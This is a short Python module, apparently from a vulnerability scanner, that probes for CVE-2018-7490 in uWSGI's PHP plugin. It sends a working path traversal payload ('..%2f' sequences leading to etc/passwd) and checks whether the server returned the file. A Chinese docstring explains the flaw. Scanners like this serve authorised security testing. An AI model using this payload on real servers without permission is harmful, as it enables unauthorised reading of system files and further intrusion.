#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2018_7490_payloads = [
    {'path': '..%2f..%2f..%2f..%2f..%2fetc/passwd'},
]

def cve_2018_7490_scan(clients):
    ''' uWSGI 2.0.17之前的PHP插件
            没有正确的处理DOCUMENT_ROOT检测
            导致用户可以通过..%2f来跨越目录, 读取或运行DOCUMENT_ROOT目录以外的文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'uWSGI-PHP',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2018-7490',
    }

    for payload in cve_2018_7490_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
